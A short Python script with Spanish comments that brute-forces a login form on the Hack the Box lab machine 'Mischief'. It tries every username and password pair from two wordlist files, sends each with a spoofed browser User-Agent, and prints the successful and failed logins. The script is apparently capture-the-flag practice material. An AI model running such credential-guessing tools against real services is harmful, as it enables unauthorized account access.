#!/usr/bin/python3

# Fuzzing básico para probar listas de nombres de usuario y contraseñas en máquina Mischief de Hack the Box.

import requests

def make_curl_request(url, username, password):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    }
    data = {
        'username': username,
        'password': password
    }
    response = requests.post(url, headers=headers, data=data)
    return response

def main():
    url = 'http://10.10.10.92:3366'
    
    usernames_file = 'usernames.txt'
    passwords_file = 'passwords.txt'
    
    with open(usernames_file, 'r') as usernames, open(passwords_file, 'r') as passwords:
        for username in usernames:
            username = username.strip()
            passwords.seek(0)  # Reinicia el puntero del archivo de contraseñas al principio
            for password in passwords:
                password = password.strip()
                response = make_curl_request(url, username, password)
                
                if response.status_code == 200:
                    print(f'Inicio de sesión exitoso - Usuario: {username}, Contraseña: {password}')
                    break
                else:
                    print(f'Inicio de sesión fallido - Usuario: {username}, Contraseña: {password}')

if __name__ == '__main__':
    main()
